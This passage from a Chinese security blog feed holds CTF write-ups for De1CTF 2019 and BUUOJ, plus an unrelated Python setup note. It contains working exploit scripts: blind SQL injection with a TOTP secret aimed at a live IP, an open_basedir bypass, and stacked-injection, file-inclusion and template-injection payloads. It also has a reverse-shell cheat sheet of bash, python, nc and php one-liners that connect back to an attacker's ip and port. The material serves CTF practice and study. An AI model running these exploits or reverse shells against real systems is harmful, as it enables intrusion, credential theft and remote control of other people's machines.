class="number">1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: unknown.\n'</span></span><br><span class="line">    elif vuln1 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 1 check: pass.\n'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == -<span class="number">1</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: unknown.\n'</span></span><br><span class="line">    elif vuln2 == <span class="number">0</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: fail.\n'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += <span class="string">'Vuln 2 check: pass.\n'</span></span><br><span class="line">    result += msg</span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line">    <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line"># <span class="built_in">get</span> flag</span><br><span class="line">def get_flag():</span><br><span class="line">    path = <span class="number">0</span></span><br><span class="line">    vuln1 = -<span class="number">1</span></span><br><span class="line">    vuln2 = -<span class="number">1</span></span><br><span class="line">    logined = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> path == <span class="number">0</span>:</span><br><span class="line">        # username = <span class="string">'1Bq2DT3j'</span></span><br><span class="line">        # password = <span class="string">'KWRpkXgHnb'</span></span><br><span class="line">        # # <span class="keyword">res</span> = <span class="keyword">reg</span>(username, password)</span><br><span class="line">        # # <span class="keyword">if</span> not re<span class="variable">s:</span> show_result(vuln1, vuln2, <span class="string">'register fail'</span>)</span><br><span class="line">        # <span class="keyword">res</span> = login(username, password)</span><br><span class="line">        # <span class="keyword">if</span> not re<span class="variable">s:</span> show_result(vuln1, vuln2, <span class="string">'login fail'</span>)</span><br><span class="line">        # time.<span class="keyword">sleep</span>(<span class="number">3</span>)</span><br><span class="line">        # <span class="keyword">res</span> = upload_music()</span><br><span class="line">        # <span class="keyword">if</span> <span class="keyword">res</span> == <span class="string">''</span>:</span><br><span class="line">        #     vuln1 = <span class="number">0</span></span><br><span class="line">        #     show_result(vuln1, vuln2, <span class="string">'leak admin password fail'</span>)</span><br><span class="line">        admin_password = <span class="string">'Mike84eiNxHcMVCz'</span></span><br><span class="line">        <span class="keyword">global</span> s</span><br><span class="line">        s = requests.session()</span><br><span class="line">        <span class="keyword">res</span> = login(<span class="string">'admin'</span>, admin_password)</span><br><span class="line">        <span class="keyword">if</span> not re<span class="variable">s:</span></span><br><span class="line">            vuln1 = <span class="number">0</span></span><br><span class="line">            show_result(vuln1, vuln2, <span class="string">'leak wrong admin password'</span>)</span><br><span class="line">        vuln1 = <span class="number">1</span></span><br><span class="line">    time.<span class="keyword">sleep</span>(<span class="number">3</span>)</span><br><span class="line">    guess_server_time = upload_firmware(<span class="keyword">command</span>)</span><br><span class="line">    <span class="keyword">print</span>(guess_server_time)</span><br><span class="line">    <span class="keyword">if</span> guess_server_time == -<span class="number">1</span>:</span><br><span class="line">        show_result(vuln1, vuln2, <span class="string">'upload fail'</span>)</span><br><span class="line">    vuln2 = <span class="number">0</span></span><br><span class="line">    succ_keyword = <span class="string">'固件版本号：'</span></span><br><span class="line">    <span class="keyword">if</span> vuln2 == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            rander = php_rand(guess_server_time - i)</span><br><span class="line">            path = hashlib.md5(str(rander.rand()) + <span class="string">'[公网ip地址]'</span>).hexdigest()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                prev_flag = firmware_version(path).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">            excep<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> succ_keyword in prev_fla<span class="variable">g:</span></span><br><span class="line">                vuln2 = <span class="number">1</span></span><br><span class="line">                prev_flag = prev_flag.replace(succ_keyword, <span class="string">''</span>).strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    show_result(vuln1, vuln2, prev_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">argv</span>) != <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"wrong params."</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"example: python %s %s %s"</span> % (<span class="built_in">argv</span>[<span class="number">0</span>], <span class="string">'127.0.0.1'</span>, <span class="string">'80'</span>))</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">    ip = <span class="built_in">argv</span>[<span class="number">1</span>]</span><br><span class="line">    port = <span class="keyword">int</span>(<span class="built_in">argv</span>[<span class="number">2</span>])</span><br><span class="line">    site_url = <span class="string">'http://%s:%d'</span> % (ip, port)</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-18efb44486672dae.png" alt></p>
<p>有个小细节，vps需要用对应时区的地区的vps，不然会有时间差……别问我怎么知道的.</p>
<h3 id="0x04-Giftbox"><a href="#0x04-Giftbox" class="headerlink" title="0x04 Giftbox"></a>0x04 Giftbox</h3><p><strong>第一层考点：login处盲注</strong><br>大前提，有个时间校验，需要系统为北京时间，直接设定时区为北京时区比较方便。<br>查看view-source:<a href="http://222.85.25.41:8090/js/" target="_blank" rel="noopener">http://222.85.25.41:8090/js/</a>知道pyotp.zip和&gt;totp.min.js是采用了双因子认证<br>在此处得到关于双因子认证的信息view-source:<a href="http://222.85.25.41:8090/js/main.js" target="_blank" rel="noopener">http://222.85.25.41:8090/js/main.js</a><br><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-28490a5764678ae7.png" alt></p>
<p>这个东西后面写脚本是TOTP用，测试发现在login处存在注入，测试payload：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span><span class="string">'/**/and/**/'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span> <span class="keyword">admin</span>   返回<span class="keyword">login</span> fail, <span class="keyword">password</span> incorrect.</span><br><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span><span class="string">'/**/and/**/'</span><span class="number">1</span><span class="string">'='</span><span class="number">2</span> <span class="keyword">admin</span>   返回<span class="keyword">login</span> fail, <span class="keyword">user</span> <span class="keyword">not</span> <span class="built_in">found</span>.</span><br></pre></td></tr></table></figure>
<p>直接写个脚本跑就行了，这里贴glzjin师傅写的二分法脚本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">http_get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">'http://222.85.25.41:8090/shell.php'</span>, params=&#123;<span class="string">'a'</span>: <span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>, <span class="string">'totp'</span>: totp.now()&#125;,</span><br><span class="line">                      data=&#123;<span class="string">'dir'</span>: <span class="string">'/'</span>, <span class="string">'pos'</span>: <span class="string">'/'</span>, <span class="string">'filename'</span>: <span class="string">'usage.md'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'login admin\'/**/and/**/('</span> + payload + <span class="string">')/**/and/**/\'1\'=\'1 admin'</span>)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_databases</span><span class="params">()</span>:</span></span><br><span class="line">    db_payload = <span class="string">"select/**/concat(password)/**/from/**/users"</span></span><br><span class="line">    db_name = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">"ascii(substr(("</span> + db_payload + <span class="string">"),%d,1))"</span> % (</span><br><span class="line">            y)</span><br><span class="line">        db_name += chr(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"值："</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half</span><span class="params">(payload)</span>:</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">"%s/**/&gt;/**/%d"</span> % (payload, mid)</span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = int((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-d0a438ddc4d2b48a.png" alt></p>
<p>得到admin用户的密码为hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}，所以可以登入admin用户：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">login</span> <span class="keyword">admin</span> hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-564f5bd7fb859949.png" alt></p>
<p><strong>第二层考点：bypass open_basedir</strong></p>
<p>利用targeting随便给一些参数赋值，可以发现当前shell.php执行的是php代码，所以思路就是利用php代码来读取flag，因为赋值有长度限制，所以需要利用代码拼接，查看phpinfo()</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">targeting <span class="selector-tag">a</span> phpinfo</span><br><span class="line">targeting <span class="selector-tag">b</span> assert</span><br><span class="line">targeting c &#123;<span class="variable">$b</span>(<span class="variable">$a</span>())&#125;</span><br></pre></td></tr></table></figure>

<p>返回的System Fatal Error! 也是一个坑，这竟然是执行成功了，查看返回包就就好</p>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-f5766be5b74f8d06.png" alt></p>
<p>可知存在open_basedir，也设置了disable_function，所以要绕open_basedir来读取其他目录文件，参考：<a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a> 进行代码拼接，bypass open_basedir的payload：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'css'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure>

<p>已经知道了需要跨两层目录，所以改写payload为：</p>
<figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">targeting a chdir</span><br><span class="line">targeting b css</span><br><span class="line">targeting <span class="keyword">c</span> &#123;<span class="variable">$a</span>(<span class="variable">$b</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">d</span> <span class="keyword">ini_set</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">e</span> <span class="keyword">open_basedir</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">f</span> ..</span><br><span class="line">targeting <span class="keyword">g</span> &#123;<span class="variable">$d</span>(<span class="variable">$e</span>,<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">h</span> &#123;<span class="variable">$a</span>(<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">i</span> &#123;<span class="variable">$a</span>(<span class="variable">$f</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">j</span> <span class="keyword">base64_</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">k</span> <span class="keyword">decode</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">l</span> $j<span class="variable">$k</span></span><br><span class="line">targeting m Ly8v</span><br><span class="line">targeting <span class="keyword">n</span> &#123;<span class="variable">$l</span>(<span class="variable">$m</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">o</span> &#123;<span class="variable">$d</span>(<span class="variable">$e</span>,<span class="variable">$n</span>)&#125;</span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">p</span> <span class="keyword">print_r</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">q</span> <span class="keyword">file_get_</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">r</span> <span class="keyword">contents</span></span><br><span class="line"><span class="keyword">targeting</span> <span class="keyword">s</span> $q<span class="variable">$r</span></span><br><span class="line">targeting t flag</span><br><span class="line">targeting <span class="keyword">u</span> &#123;<span class="variable">$p</span>(<span class="variable">$s</span>(<span class="variable">$t</span>))&#125;</span><br><span class="line"><span class="keyword">launch</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/05/2019-De1CTF-Web-wp/8418106-01f11aad51f49599.png" alt></p>
<h3 id="0x05-9calc"><a href="#0x05-9calc" class="headerlink" title="0x05 9calc"></a>0x05 9calc</h3><p>直接弃了~<br>源码地址：<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/de1ctf2019/9-calc" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/de1ctf2019/9-calc</a><br>官方wp：<a href="https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/3.mdh" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/blob/master/calcalcalc-family/3.mdh</a></p>
]]></content>
      <categories>
        <category>Cyc1e的CTF之路</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>open_basedir</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10搭建python2和python3、pip2和pip3共存环境搭建</title>
    <url>/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p><strong>最近新换了电脑，装环境真的装到了自闭，老电脑装的是python2环境，没有装python3，新电脑打算两个环境都装上，让两个版本以及pip同时可用，这里简单记录下</strong></p>
<h3 id="0x01-下载地址"><a href="#0x01-下载地址" class="headerlink" title="0x01 下载地址"></a>0x01 下载地址</h3><p><a href="https://www.python.org/downloads/，分别下载python2和python3即可" target="_blank" rel="noopener">https://www.python.org/downloads/，分别下载python2和python3即可</a></p>
<h3 id="0x02-环境变量"><a href="#0x02-环境变量" class="headerlink" title="0x02 环境变量"></a>0x02 环境变量</h3><p>修改python2文件夹中python.exe和pythonw.exe分别为python2.exe和pythonw2.exe；<br>修改python3文件夹中python.exe和pythonw.exe分别为python3.exe和pythonw3.exe<br>（注：方便用的话修改其中一个版本就好了，比如我就修改python3的）<br>然后分别将python路径以及Scripts(里面有easy_install和pip)文件夹路径加入系统环境变量，比如我的python路径分别为</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">D:<span class="tag">\<span class="name">Python</span></span>3<span class="tag">\</span></span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>3<span class="tag">\<span class="name">Scripts</span></span></span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>27</span><br><span class="line">D:<span class="tag">\<span class="name">Python</span></span>27<span class="tag">\<span class="name">Scripts</span></span></span><br></pre></td></tr></table></figure>
<h3 id="0x03-分别重装两个版本的pip"><a href="#0x03-分别重装两个版本的pip" class="headerlink" title="0x03 分别重装两个版本的pip"></a>0x03 分别重装两个版本的pip</h3><p>两个版本都默认带有pip的，已装的的pip.exe是默认以python.exe文件启动的，而我们前面修改python.exe分别为python2和python3，所以默认的pip找不到启动文件便无法执行，所以需要进行重装，分别执行如下命令：</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">python2</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">pip</span> <span class="comment">install</span> --<span class="comment">upgrade</span> <span class="comment">pip</span> --<span class="comment">force</span><span class="literal">-</span><span class="comment">reinstall</span></span><br><span class="line"><span class="comment">python3</span> <span class="literal">-</span><span class="comment">m</span> <span class="comment">pip</span> <span class="comment">install</span> --<span class="comment">upgrade</span> <span class="comment">pip</span> --<span class="comment">force</span><span class="literal">-</span><span class="comment">reinstall</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/04/Windows10%E6%90%AD%E5%BB%BApython2%E5%92%8Cpython3%E3%80%81pip2%E5%92%8Cpip3%E5%85%B1%E5%AD%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/8418106-eaf361a2202574e6.png" alt></p>
]]></content>
      <categories>
        <category>水滴随笔</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 几种反弹shell方式</title>
    <url>/2019/08/02/Linux-%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<p><strong>写简单些给自己用的，省得每次记不住都得靠度娘</strong><br>接收端主机利用nc监听端口</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Windows：nc -l -v -p <span class="number">8888</span></span><br><span class="line">Linux：nc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>
<p>放个nc: <a href="https://pan.baidu.com/s/1B0jehdcst5aYR0HLbXSM9w" target="_blank" rel="noopener">https://pan.baidu.com/s/1B0jehdcst5aYR0HLbXSM9w</a> 提取码: 9vya</p>
<h3 id="0x01-bash"><a href="#0x01-bash" class="headerlink" title="0x01 bash"></a>0x01 bash</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="0x02-python"><a href="#0x02-python" class="headerlink" title="0x02 python"></a>0x02 python</h3><figure class="highlight csp"><table><tr><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">'ip'</span>,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([<span class="string">'/bin/bash'</span>,<span class="string">'-i'</span>]);"</span><br></pre></td></tr></table></figure>

<h3 id="0x03-nc"><a href="#0x03-nc" class="headerlink" title="0x03 nc"></a>0x03 nc</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看nc版本，有的nc没有-e参数</span></span><br><span class="line">nc -e /bin/bash<span class="built_in"> ip </span>port</span><br></pre></td></tr></table></figure>

<h3 id="0x04-php"><a href="#0x04-php" class="headerlink" title="0x04 php"></a>0x04 php</h3><figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">php -r 'exec(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"</span>);' <span class="comment">#这个测没成，先留着调调再说</span></span><br><span class="line">php -r '<span class="variable">$sock</span>=fsockopen(<span class="string">"ip"</span>,<span class="keyword">port</span>);exec(<span class="string">"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'</span><br><span class="line">php -r '<span class="variable">$sock</span>=fsockopen(<span class="string">"ip"</span>,<span class="keyword">port</span>);exec(<span class="string">"/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"</span>);' <span class="comment">#Centos</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#php标准输入输出重定向到socket中，不借助其他语言支持</span></span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>水滴随笔</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUOJ Web练手记录</title>
    <url>/2019/08/01/BUUOJ-Web%E7%BB%83%E6%89%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>最近发现北京联合大学的OJ平台特别不错，题目都是近期比赛的题，有些是在比赛中解出了的，有些没有解出刚好想要复现，这里简单记录下解题的思路过程，有时间练手就更新。平台地址：<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a></p>
<h3 id="0x01-Warmup"><a href="#0x01-Warmup" class="headerlink" title="0x01 Warmup"></a>0x01 Warmup</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>考点为 <strong>phpmyadmin4.8.1远程文件包含漏洞(CVE-2018-12613)</strong> ，payload：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php?..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/ffffllllaaaagggg</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-随便注"><a href="#0x02-随便注" class="headerlink" title="0x02 随便注"></a>0x02 随便注</h3><p>（强网杯线上题）</p>
<p>考点为堆叠注入，也就是以用分号执行多条sql注入语句，并且ban了select等查询关键字，不过题目环境设置默认存在一个select，所以逻辑就是在flag所在的表插入一个id列，将原表改名为其他，flag表改名为查询表，直接查询id=1，即可得到flag。查询表名语句:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>

<p>可以查看到存放flag的表1919810931114514和当前查询表words，payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">add</span> <span class="string">`id`</span> <span class="built_in">INT</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'1'</span> <span class="keyword">after</span> <span class="string">`flag`</span>;<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> words1;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;desc words;</span><br></pre></td></tr></table></figure>
<p>直接查询id=1即可得flag</p>
<h3 id="0x03-easy-tornado"><a href="#0x03-easy-tornado" class="headerlink" title="0x03 easy_tornado"></a>0x03 easy_tornado</h3><p>（护网杯）</p>
<p>根据查看文件内容的url：/file?filename=/hints.txt&amp;filehash=bf60e1051f59dbb931208200bcf8c08e 以及hint.txt中的提示内容：md5(cookie_secret+md5(filename))可以很清楚该题得逻辑，令filename=/fllllllllllllag，找到cookie_secret，计算出filehash值即可，该题考点在于ssti，ssti点在/msg={{}}处，所以查看{{handle_settings}} 可以得到相关的配置信息，其中cookie_secret=M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r用于计算filehash</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie_secret = <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span>;</span><br><span class="line">$filename = <span class="string">'/fllllllllllllag'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($cookie_secret.md5($filename));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#计算得filehash=70aed71508e50d160a73756a21e9953d</span></span><br></pre></td></tr></table></figure>
<p>最终payload:</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">/<span class="meta">file</span>?<span class="meta">filename</span>=/fllllllllllllag<span class="variable">&amp;filehash</span>=70aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure>



